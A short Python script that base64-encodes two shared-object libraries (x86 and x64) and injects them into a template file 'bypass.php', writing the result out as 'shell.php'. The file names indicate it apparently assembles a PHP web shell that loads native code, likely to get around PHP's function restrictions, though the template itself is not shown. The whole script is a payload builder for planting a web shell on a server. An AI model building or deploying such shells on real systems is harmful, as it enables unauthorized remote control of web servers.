import base64
import sys


if len(sys.argv) != 3:
    print('[+]Usage: python {} <x86 so> <x64 so>')
    exit()

x86_so = base64.b64encode(open(sys.argv[1], 'rb').read())
x64_so = base64.b64encode(open(sys.argv[2], 'rb').read())


template = open('bypass.php', 'r').read()
shell = template.replace('~x86.so~', x86_so).replace('~x64.so~', x64_so)

open('shell.php', 'w').write(shell)
